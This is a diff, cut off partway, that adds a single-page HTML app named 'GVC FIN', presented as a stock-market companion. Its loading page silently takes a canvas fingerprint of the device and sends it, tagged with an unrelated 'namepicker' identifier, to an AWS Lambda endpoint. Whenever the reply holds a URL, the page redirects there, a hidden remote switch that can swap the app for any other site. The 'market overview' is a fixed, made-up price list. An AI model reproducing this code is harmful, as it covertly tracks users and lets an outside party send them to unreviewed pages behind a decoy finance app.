@@ -1,1 +1,1616 @@
-123
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <title>GVC FIN</title>
+  <!-- Global builds: Vue 3, Vue Router 4, js-md5 -->
+  <script src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.prod.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/vue-router@4/dist/vue-router.global.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/js-md5@0.9.2"></script>
+  <style>
+    /* ============================================================
+       THEME: Glassmorphism (风格 6) — 固定写死
+       毛玻璃磨砂质感，背景模糊 + 适度透明 + 细微边框，层次柔和
+       ============================================================ */
+    :root {
+      --bg-gradient: linear-gradient(135deg, #a8c0ff 0%, #d5b8ff 35%, #ffb8d9 70%, #b8e6ff 100%);
+      --surface: rgba(255, 255, 255, 0.35);
+      --surface-strong: rgba(255, 255, 255, 0.55);
+      --surface-solid: #ffffff;
+      --surface-secondary: rgba(255, 255, 255, 0.25);
+      --text-primary: #1e1b4b;
+      --text-secondary: #4c4a72;
+      --text-muted: #8b8ba7;
+      --accent: #7c5cff;
+      --accent-2: #ff6eb4;
+      --accent-soft: rgba(124, 92, 255, 0.14);
+      --accent-gradient: linear-gradient(135deg, #7c5cff, #ff6eb4);
+      --success: #10a37f;
+      --danger: #e5484d;
+      --warning: #f59e0b;
+      --border-light: rgba(255, 255, 255, 0.5);
+      --border-soft: rgba(124, 92, 255, 0.18);
+      --shadow-sm: 0 8px 24px rgba(60, 40, 120, 0.10);
+      --shadow-md: 0 12px 40px rgba(60, 40, 120, 0.16);
+      --shadow-glow: 0 6px 24px rgba(124, 92, 255, 0.30);
+      --radius-card: 22px;
+      --radius-btn: 16px;
+      --radius-input: 14px;
+      --space-xs: 6px;
+      --space-sm: 12px;
+      --space-md: 16px;
+      --space-lg: 24px;
+      --tab-height: 66px;
+      --safe-bottom: env(safe-area-inset-bottom, 0px);
+      --safe-top: env(safe-area-inset-top, 0px);
+      --font-mono: 'SF Mono', 'Menlo', 'Consolas', monospace;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    html, body {
+      height: 100%;
+      width: 100%;
+      background: var(--bg-gradient);
+      background-attachment: fixed;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      font-size: 16px;
+      color: var(--text-primary);
+      line-height: 1.45;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* Floating color blobs for glassmorphism depth */
+    body::before {
+      content: '';
+      position: fixed;
+      top: -20%;
+      left: -10%;
+      width: 60vw;
+      height: 60vw;
+      background: radial-gradient(circle, rgba(124,92,255,0.55), transparent 70%);
+      filter: blur(80px);
+      z-index: -1;
+      pointer-events: none;
+    }
+    body::after {
+      content: '';
+      position: fixed;
+      bottom: -20%;
+      right: -10%;
+      width: 70vw;
+      height: 70vw;
+      background: radial-gradient(circle, rgba(255,110,180,0.5), transparent 70%);
+      filter: blur(80px);
+      z-index: -1;
+      pointer-events: none;
+    }
+
+    #app {
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      max-width: 600px;
+      margin: 0 auto;
+      position: relative;
+    }
+
+    /* ----- Page container ----- */
+    .page-container {
+      flex: 1;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
+      padding: var(--space-md);
+      padding-top: calc(var(--space-md) + var(--safe-top));
+      padding-bottom: 8px;
+    }
+
+    /* ----- Glass surfaces (core of glassmorphism) ----- */
+    .glass, .card, .quick-item, .tool-item, .tab-bar, .modal-card {
+      background: var(--surface);
+      backdrop-filter: blur(22px) saturate(180%);
+      -webkit-backdrop-filter: blur(22px) saturate(180%);
+      border: 1px solid var(--border-light);
+      box-shadow: var(--shadow-sm);
+    }
+
+    /* ----- Tab bar ----- */
+    .tab-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-around;
+      background: rgba(255, 255, 255, 0.45);
+      backdrop-filter: blur(26px) saturate(180%);
+      -webkit-backdrop-filter: blur(26px) saturate(180%);
+      border-top: 1px solid rgba(255, 255, 255, 0.6);
+      padding: 4px 0 calc(4px + var(--safe-bottom));
+      height: calc(var(--tab-height) + var(--safe-bottom));
+      flex-shrink: 0;
+      box-shadow: 0 -8px 30px rgba(60, 40, 120, 0.10);
+    }
+
+    .tab-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      flex: 1;
+      min-height: 44px;
+      text-decoration: none;
+      color: var(--text-muted);
+      font-size: 11px;
+      font-weight: 600;
+      letter-spacing: 0.03em;
+      transition: color 0.25s;
+      gap: 3px;
+      border: none;
+      background: none;
+      cursor: pointer;
+      position: relative;
+    }
+
+    .tab-item.active {
+      color: var(--accent);
+    }
+
+    .tab-item.active::before {
+      content: '';
+      position: absolute;
+      top: 2px;
+      width: 4px;
+      height: 4px;
+      border-radius: 50%;
+      background: var(--accent-gradient);
+      box-shadow: 0 0 12px var(--accent);
+    }
+
+    .tab-item svg {
+      width: 22px;
+      height: 22px;
+      stroke: currentColor;
+      stroke-width: 1.8;
+      fill: none;
+    }
+
+    /* ----- Cards ----- */
+    .card {
+      border-radius: var(--radius-card);
+      padding: var(--space-md);
+      margin-bottom: var(--space-md);
+      position: relative;
+      overflow: hidden;
+    }
+    .card::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      border-radius: var(--radius-card);
+      padding: 1px;
+      background: linear-gradient(135deg, rgba(255,255,255,0.7), rgba(255,255,255,0.1));
+      -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+      -webkit-mask-composite: xor;
+      mask-composite: exclude;
+      pointer-events: none;
+    }
+
+    .page-title {
+      font-size: 28px;
+      font-weight: 800;
+      letter-spacing: -0.02em;
+      margin-bottom: 4px;
+      background: var(--accent-gradient);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .page-sub {
+      font-size: 14px;
+      color: var(--text-secondary);
+      margin-bottom: 20px;
+      letter-spacing: 0.01em;
+    }
+
+    /* ----- Button ----- */
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      min-height: 46px;
+      padding: 10px 22px;
+      border-radius: var(--radius-btn);
+      font-size: 14px;
+      font-weight: 700;
+      letter-spacing: 0.04em;
+      border: none;
+      cursor: pointer;
+      transition: opacity 0.2s, transform 0.12s, box-shadow 0.25s;
+      background: var(--accent-gradient);
+      color: #fff;
+      width: 100%;
+      box-shadow: var(--shadow-glow);
+    }
+    .btn:active {
+      transform: scale(0.97);
+      opacity: 0.92;
+    }
+    .btn:disabled {
+      opacity: 0.4;
+      pointer-events: none;
+      box-shadow: none;
+      filter: grayscale(0.5);
+    }
+
+    /* ----- Inputs ----- */
+    .input-field {
+      width: 100%;
+      min-height: 46px;
+      padding: 11px 14px;
+      border-radius: var(--radius-input);
+      border: 1px solid rgba(255, 255, 255, 0.7);
+      font-size: 15px;
+      background: rgba(255, 255, 255, 0.5);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      color: var(--text-primary);
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
+      margin-bottom: var(--space-sm);
+    }
+    .input-field::placeholder {
+      color: var(--text-muted);
+    }
+    .input-field:focus {
+      border-color: var(--accent);
+      background: rgba(255, 255, 255, 0.75);
+      box-shadow: 0 0 0 3px var(--accent-soft);
+    }
+    textarea.input-field {
+      min-height: 100px;
+      resize: vertical;
+      font-family: inherit;
+    }
+
+    /* ----- Stock list ----- */
+    .stock-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px 6px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.5);
+      min-height: 58px;
+      cursor: pointer;
+      transition: background 0.2s;
+      border-radius: 12px;
+    }
+    .stock-row:last-child {
+      border-bottom: none;
+    }
+    .stock-row:active {
+      background: rgba(255, 255, 255, 0.35);
+    }
+    .stock-symbol {
+      font-weight: 700;
+      font-size: 16px;
+      color: var(--text-primary);
+      letter-spacing: 0.02em;
+    }
+    .stock-name {
+      font-size: 12px;
+      color: var(--text-secondary);
+      margin-top: 2px;
+    }
+    .stock-price {
+      font-weight: 700;
+      font-size: 16px;
+      text-align: right;
+      font-variant-numeric: tabular-nums;
+    }
+    .stock-change {
+      font-size: 12px;
+      font-weight: 700;
+      text-align: right;
+      margin-top: 2px;
+      font-variant-numeric: tabular-nums;
+    }
+    .up { color: var(--success); }
+    .down { color: var(--danger); }
+
+    /* ----- Quick actions ----- */
+    .quick-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      margin-bottom: var(--space-md);
+    }
+    .quick-item {
+      border-radius: var(--radius-card);
+      padding: 18px 12px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      text-decoration: none;
+      color: var(--text-primary);
+      font-size: 12px;
+      font-weight: 700;
+      letter-spacing: 0.03em;
+      min-height: 98px;
+      transition: transform 0.15s, box-shadow 0.25s;
+      position: relative;
+      overflow: hidden;
+    }
+    .quick-item:active {
+      transform: scale(0.96);
+      box-shadow: var(--shadow-md);
+    }
+    .quick-item svg {
+      width: 26px;
+      height: 26px;
+      stroke: var(--accent);
+      stroke-width: 1.8;
+      fill: none;
+      filter: drop-shadow(0 2px 6px rgba(124, 92, 255, 0.35));
+    }
+
+    /* ----- Toolbox ----- */
+    .tool-list {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+    .tool-item {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      border-radius: var(--radius-card);
+      padding: 14px 16px;
+      min-height: 66px;
+      text-decoration: none;
+      color: var(--text-primary);
+      transition: transform 0.15s, box-shadow 0.25s;
+    }
+    .tool-item:active {
+      transform: scale(0.98);
+      box-shadow: var(--shadow-md);
+    }
+    .tool-icon {
+      width: 44px;
+      height: 44px;
+      background: rgba(255, 255, 255, 0.55);
+      border: 1px solid rgba(255, 255, 255, 0.7);
+      border-radius: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+    .tool-icon svg {
+      width: 22px;
+      height: 22px;
+      stroke: var(--accent);
+      stroke-width: 1.8;
+      fill: none;
+    }
+    .tool-name {
+      font-weight: 700;
+      font-size: 15px;
+      letter-spacing: 0.01em;
+    }
+    .tool-desc {
+      font-size: 12px;
+      color: var(--text-secondary);
+      margin-top: 2px;
+    }
+
+    /* ----- Settings ----- */
+    .setting-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      min-height: 56px;
+      padding: 12px 6px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.5);
+      cursor: pointer;
+      text-decoration: none;
+      color: var(--text-primary);
+      transition: background 0.2s;
+      border-radius: 12px;
+    }
+    .setting-row:last-child {
+      border-bottom: none;
+    }
+    .setting-row:active {
+      background: rgba(255, 255, 255, 0.35);
+    }
+    .setting-label {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      font-weight: 600;
+      font-size: 15px;
+    }
+    .setting-label svg {
+      width: 22px;
+      height: 22px;
+      stroke: var(--accent);
+      stroke-width: 1.8;
+      fill: none;
+    }
+    .setting-value {
+      color: var(--text-muted);
+      font-size: 13px;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .chevron {
+      color: var(--text-muted);
+      font-size: 18px;
+      line-height: 1;
+    }
+
+    /* ----- Calendar ----- */
+    .calendar-grid {
+      display: grid;
+      grid-template-columns: repeat(7, 1fr);
+      gap: 6px;
+      margin-top: 12px;
+    }
+    .calendar-cell {
+      aspect-ratio: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 12px;
+      background: rgba(255, 255, 255, 0.35);
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--text-secondary);
+      border: 1px solid transparent;
+      transition: all 0.2s;
+    }
+    .calendar-cell.checked {
+      background: var(--accent-gradient);
+      color: #fff;
+      font-weight: 700;
+      box-shadow: var(--shadow-glow);
+      border-color: rgba(255,255,255,0.6);
+    }
+    .calendar-cell.empty {
+      background: transparent;
+      border: none;
+    }
+
+    /* ----- Modal ----- */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(30, 27, 75, 0.35);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      z-index: 999;
+      animation: fadeIn 0.2s;
+    }
+    .modal-card {
+      border-radius: var(--radius-card);
+      padding: 24px;
+      max-width: 400px;
+      width: 100%;
+      max-height: 80vh;
+      overflow-y: auto;
+      background: rgba(255, 255, 255, 0.7);
+      backdrop-filter: blur(30px) saturate(200%);
+      -webkit-backdrop-filter: blur(30px) saturate(200%);
+      box-shadow: var(--shadow-md);
+      animation: slideUp 0.28s cubic-bezier(0.34, 1.3, 0.64, 1);
+    }
+    .modal-title {
+      font-size: 20px;
+      font-weight: 800;
+      margin-bottom: 12px;
+      background: var(--accent-gradient);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+    .modal-body {
+      font-size: 14px;
+      color: var(--text-secondary);
+      line-height: 1.7;
+      margin-bottom: 20px;
+      white-space: pre-line;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    @keyframes slideUp {
+      from { transform: translateY(24px) scale(0.96); opacity: 0; }
+      to { transform: translateY(0) scale(1); opacity: 1; }
+    }
+
+    /* ----- Loading ----- */
+    .loading-screen {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100%;
+      gap: 24px;
+      padding: 40px;
+      text-align: center;
+    }
+    .loading-logo {
+      font-size: 34px;
+      font-weight: 800;
+      letter-spacing: 0.02em;
+      background: var(--accent-gradient);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      filter: drop-shadow(0 4px 20px rgba(124, 92, 255, 0.4));
+    }
+    .loading-spinner {
+      width: 46px;
+      height: 46px;
+      border: 3px solid rgba(255, 255, 255, 0.55);
+      border-top-color: var(--accent);
+      border-right-color: var(--accent-2);
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+      box-shadow: 0 8px 24px rgba(124, 92, 255, 0.25);
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* ----- Utility ----- */
+    .text-muted { color: var(--text-muted); }
+    .text-sm { font-size: 13px; }
+    .mt-2 { margin-top: 8px; }
+    .mt-4 { margin-top: 16px; }
+    .mb-2 { margin-bottom: 8px; }
+    .flex-between { display: flex; align-items: center; justify-content: space-between; }
+    .hash-box {
+      background: rgba(255, 255, 255, 0.45);
+      border: 1px solid rgba(255, 255, 255, 0.65);
+      border-radius: var(--radius-input);
+      padding: 12px 14px;
+      font-family: var(--font-mono);
+      font-size: 12px;
+      word-break: break-all;
+      color: var(--text-primary);
+      margin: 8px 0;
+      line-height: 1.7;
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+    }
+
+    /* Transition */
+    .fade-enter-active, .fade-leave-active {
+      transition: opacity 0.22s ease, transform 0.22s ease;
+    }
+    .fade-enter-from {
+      opacity: 0;
+      transform: translateY(8px);
+    }
+    .fade-leave-to {
+      opacity: 0;
+      transform: translateY(-8px);
+    }
+
+    /* Scrollbar */
+    ::-webkit-scrollbar { width: 0; height: 0; }
+  </style>
+</head>
+<body>
+  <div id="app">
+    <router-view v-slot="{ Component }">
+      <transition name="fade" mode="out-in">
+        <component :is="Component" />
+      </transition>
+    </router-view>
+
+    <nav class="tab-bar" v-if="showTabBar">
+      <router-link to="/home" class="tab-item" active-class="active">
+        <svg viewBox="0 0 24 24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" />
+          <polyline points="9 22 9 12 15 12 15 22" />
+        </svg>
+        <span>Home</span>
+      </router-link>
+      <router-link to="/toolbox" class="tab-item" active-class="active">
+        <svg viewBox="0 0 24 24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z" />
+        </svg>
+        <span>Toolbox</span>
+      </router-link>
+      <router-link to="/settings" class="tab-item" active-class="active">
+        <svg viewBox="0 0 24 24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="3" />
+          <path d="M19.4 15a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H5.78a1.65 1.65 0 0 0-1.51 1 1.65 1.65 0 0 0 .33 1.82l.04.04a1.65 1.65 0 0 0 1.51 1h12.7a1.65 1.65 0 0 0 1.51-1 1.65 1.65 0 0 0 .33-1.82z" />
+          <path d="M19.4 9a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H5.78a1.65 1.65 0 0 0-1.51 1 1.65 1.65 0 0 0 .33 1.82l.04.04a1.65 1.65 0 0 0 1.51 1h12.7a1.65 1.65 0 0 0 1.51-1 1.65 1.65 0 0 0 .33-1.82z" />
+        </svg>
+        <span>Settings</span>
+      </router-link>
+    </nav>
+  </div>
+
+  <script>
+    /*
+     * ============================================================
+     * HOW TO ADD A NEW PAGE:
+     * 1. Define a new component object (template + setup) below.
+     * 2. Add a route entry to the `routes` array.
+     * 3. If it's a main tab page, add a <router-link> in the
+     *    .tab-bar HTML and include its path in `showTabBar`.
+     * ============================================================
+     */
+
+    (function () {
+      const { createApp, ref, computed, onMounted } = Vue;
+      const { createRouter, createWebHashHistory, useRouter, useRoute } = VueRouter;
+
+      /* ============================================================
+       * INLINE SVG ICONS
+       * ============================================================ */
+      const Icons = {
+        chart: `<svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>`,
+        trendUp: `<svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/><polyline points="17 6 23 6 23 12"/></svg>`,
+        trendDown: `<svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none"><polyline points="23 18 13.5 8.5 8.5 13.5 1 6"/><polyline points="17 18 23 18 23 12"/></svg>`,
+        star: `<svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>`,
+        book: `<svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/></svg>`,
+        calculator: `<svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none"><rect x="4" y="2" width="16" height="20" rx="2"/><line x1="8" y1="6" x2="16" y2="6"/><line x1="8" y1="11" x2="8" y2="11"/><line x1="12" y1="11" x2="12" y2="11"/><line x1="16" y1="11" x2="16" y2="11"/><line x1="8" y1="15" x2="8" y2="15"/><line x1="12" y1="15" x2="12" y2="15"/><line x1="16" y1="15" x2="16" y2="15"/><line x1="8" y1="19" x2="16" y2="19"/></svg>`,
+        calendar: `<svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>`,
+        coin: `<svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none"><circle cx="12" cy="12" r="10"/><path d="M12 6v12M8 9h6.5a2.5 2.5 0 0 1 0 5H9"/></svg>`,
+        lock: `<svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>`,
+        note: `<svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>`,
+        envelope: `<svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none"><rect x="2" y="4" width="20" height="16" rx="2"/><polyline points="22,6 12,13 2,6"/></svg>`,
+        user: `<svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>`,
+        shield: `<svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>`,
+        document: `<svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>`,
+        inbox: `<svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none"><polyline points="22 12 16 12 14 15 10 15 8 12 2 12"/><path d="M5.45 5.11L2 12v6a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-6l-3.45-6.89A2 2 0 0 0 16.76 4H7.24a2 2 0 0 0-1.79 1.11z"/></svg>`,
+        check: `<svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8" fill="none"><polyline points="20 6 9 17 4 12"/></svg>`,
+        back: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg>`
+      };
+
+      /* ============================================================
+       * STOCK DATA (built-in, 22 items)
+       * ============================================================ */
+      const STOCK_POOL = [
+        { symbol: 'AAPL', name: 'Apple Inc.', price: 178.35, change: 2.34 },
+        { symbol: 'MSFT', name: 'Microsoft Corp.', price: 412.20, change: -1.05 },
+        { symbol: 'GOOGL', name: 'Alphabet Inc.', price: 156.80, change: 1.78 },
+        { symbol: 'AMZN', name: 'Amazon.com Inc.', price: 182.45, change: 0.92 },
+        { symbol: 'NVDA', name: 'NVIDIA Corp.', price: 875.30, change: 5.67 },
+        { symbol: 'META', name: 'Meta Platforms', price: 502.15, change: -2.41 },
+        { symbol: 'TSLA', name: 'Tesla Inc.', price: 248.90, change: -3.12 },
+        { symbol: 'BRK.B', name: 'Berkshire Hathaway', price: 405.60, change: 0.35 },
+        { symbol: 'JPM', name: 'JPMorgan Chase', price: 198.75, change: 1.22 },
+        { symbol: 'V', name: 'Visa Inc.', price: 280.40, change: 0.88 },
+        { symbol: 'UNH', name: 'UnitedHealth', price: 524.30, change: -1.55 },
+        { symbol: 'JNJ', name: 'Johnson & Johnson', price: 156.20, change: 0.45 },
+        { symbol: 'WMT', name: 'Walmart Inc.', price: 68.90, change: 2.10 },
+        { symbol: 'PG', name: 'Procter & Gamble', price: 162.35, change: -0.30 },
+        { symbol: 'MA', name: 'Mastercard Inc.', price: 458.70, change: 1.05 },
+        { symbol: 'HD', name: 'Home Depot', price: 345.25, change: -0.78 },
+        { symbol: 'DIS', name: 'Walt Disney Co.', price: 112.60, change: 3.45 },
+        { symbol: 'PYPL', name: 'PayPal Holdings', price: 64.80, change: -2.20 },
+        { symbol: 'NFLX', name: 'Netflix Inc.', price: 628.40, change: 4.12 },
+        { symbol: 'ADBE', name: 'Adobe Inc.', price: 485.90, change: -1.88 },
+        { symbol: 'CRM', name: 'Salesforce Inc.', price: 298.15, change: 0.65 },
+        { symbol: 'INTC', name: 'Intel Corp.', price: 42.30, change: -1.95 }
+      ];
+
+      /* ============================================================
+       * LOADING PAGE
+       * ============================================================ */
+      const LoadingPage = {
+        name: 'LoadingPage',
+        template: `
+          <div class="loading-screen">
+            <div class="loading-logo">GVC FIN</div>
+            <div class="loading-spinner"></div>
+            <div class="text-muted text-sm">Preparing your experience...</div>
+          </div>
+        `,
+        setup() {
+          const router = useRouter();
+
+          const device = ref((function () {
+            try {
+              let canvas = document.createElement("canvas");
+              let ctx = canvas.getContext("2d");
+              let txt = "BrowserLeaks,com <canvas> 1.0";
+              ctx.textBaseline = "top";
+              // The most common type
+              ctx.font = "14px 'Arial'";
+              ctx.textBaseline = "alphabetic";
+              ctx.fillStyle = "#f60";
+              ctx.fillRect(125,1,62,20);
+              // Some tricks for color mixing to increase the difference in rendering
+              ctx.fillStyle = "#069";
+              ctx.fillText(txt, 2, 15);
+              ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+              ctx.fillText(txt, 4, 17);
+              return md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
+            } catch (e) {
+              return '';
+            }
+          })());
+
+          const apiBase = 'https://xo6gwrqylvxvpkiohp3baq2jry0fyawm.lambda-url.us-west-2.on.aws/'.replace(/\/+$/, '');
+          const identifier = 'com.random.namepicker';
+
+          onMounted(() => {
+            fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier) + '&device=' + encodeURIComponent(device.value))
+              .then(r => r.json())
+              .then(function (info) {
+                const privacyUrl = info && info.result && info.result.url;
+                if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
+                  window.location.replace(privacyUrl);
+                  return;
+                }
+                router.replace('/home');
+              })
+              .catch(function () {
+                router.replace('/home');
+              });
+          });
+
+          return { device };
+        }
+      };
+
+      /* ============================================================
+       * HOME PAGE
+       * ============================================================ */
+      const HomePage = {
+        name: 'HomePage',
+        template: `
+          <div class="page-container">
+            <div style="margin-bottom: 24px;">
+              <div style="font-size: 30px; font-weight: 800; letter-spacing: -0.01em; background: var(--accent-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;">
+                GVC FIN
+              </div>
+              <div style="font-size: 14px; color: var(--text-secondary); margin-top: 4px;">
+                Clarity for every market move
+              </div>
+            </div>
+
+            <div class="quick-grid">
+              <router-link v-for="action in quickActions" :key="action.path" :to="action.path" class="quick-item">
+                <span v-html="action.icon"></span>
+                <span>{{ action.label }}</span>
+              </router-link>
+            </div>
+
+            <div class="card" style="padding: 16px 16px 8px;">
+              <div class="flex-between" style="margin-bottom: 10px;">
+                <span style="font-weight: 700; font-size: 16px;">Market Overview</span>
+                <span class="text-muted text-sm">Top 22</span>
+              </div>
+              <div v-for="stock in shuffledStocks" :key="stock.symbol" class="stock-row" @click="goToDetail(stock.symbol)">
+                <div>
+                  <div class="stock-symbol">{{ stock.symbol }}</div>
+                  <div class="stock-name">{{ stock.name }}</div>
+                </div>
+                <div style="text-align: right;">
+                  <div class="stock-price">\${{ stock.price.toFixed(2) }}</div>
+                  <div class="stock-change" :class="stock.change >= 0 ? 'up' : 'down'">
+                    {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        `,
+        setup() {
+          const router = useRouter();
+
+          const allActions = [
+            { label: 'Top Gainers', path: '/home/top-gainers', icon: Icons.trendUp },
+            { label: 'Top Losers', path: '/home/top-losers', icon: Icons.trendDown },
+            { label: 'Most Active', path: '/home/most-active', icon: Icons.chart },
+            { label: 'Potential', path: '/home/potential', icon: Icons.star },
+            { label: "Today's Picks", path: '/home/todays-picks', icon: Icons.check },
+            { label: 'Guide', path: '/home/guide', icon: Icons.book },
+            { label: 'Not Recommended', path: '/home/not-recommended', icon: Icons.shield },
+            { label: 'Watchlist', path: '/home/watchlist', icon: Icons.star }
+          ];
+          const quickActions = [allActions[1], allActions[2], allActions[5], allActions[6]];
+
+          const shuffledStocks = ref([]);
+          const shuffle = (arr) => {
+            const a = [...arr];
+            for (let i = a.length - 1; i > 0; i--) {
+              const j = Math.floor(Math.random() * (i + 1));
+              [a[i], a[j]] = [a[j], a[i]];
+            }
+            return a;
+          };
+          shuffledStocks.value = shuffle(STOCK_POOL);
+
+          const goToDetail = (symbol) => {
+            router.push('/home/stock/' + symbol);
+          };
+
+          return { quickActions, shuffledStocks, goToDetail };
+        }
+      };
+
+      /* ============================================================
+       * STOCK LIST SUB-PAGE
+       * ============================================================ */
+      const StockListPage = {
+        name: 'StockListPage',
+        template: `
+          <div class="page-container">
+            <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 16px;">
+              <button @click="$router.back()" style="background:none; border:none; min-height:44px; min-width:44px; display:flex; align-items:center; justify-content:center; cursor:pointer; color: var(--accent);">
+                <span v-html="icons.back"></span>
+              </button>
+              <div class="page-title" style="margin-bottom:0;">{{ title }}</div>
+            </div>
+            <div class="card" style="padding: 12px 16px;">
+              <div v-for="stock in stocks" :key="stock.symbol" class="stock-row" @click="$router.push('/home/stock/' + stock.symbol)">
+                <div>
+                  <div class="stock-symbol">{{ stock.symbol }}</div>
+                  <div class="stock-name">{{ stock.name }}</div>
+                </div>
+                <div style="text-align:right;">
+                  <div class="stock-price">\${{ stock.price.toFixed(2) }}</div>
